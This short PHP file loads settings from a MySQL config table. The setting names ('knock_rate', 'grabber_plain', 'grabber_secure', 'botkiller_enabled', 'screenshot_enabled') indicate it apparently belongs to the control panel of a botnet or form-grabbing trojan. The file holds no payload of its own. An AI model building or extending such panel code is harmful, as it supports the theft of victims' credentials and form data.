<?php
include __DIR__ .  '/config.php';

$settings_array = array();
$mysqli = ConnectMySQLi($db_host, $db_login, $db_password, $db_database);
if ($result = $mysqli->query('SELECT * FROM ' . DB_CONFIG . ' WHERE config_name IN ("knock_rate", "ban_enabled", "grabber_plain", "grabber_secure", "grabber_parse_extra", "screenshot_enabled", "botkiller_enabled", "grabber_blacklist", "grabber_whitelist", "knock_rate_id", "geo_enabled");')) {
    while ($row = $result->fetch_row()) {
        $settings_array[$row[0]] = $row[1];
    }
}
$mysqli->close();
return $settings_array;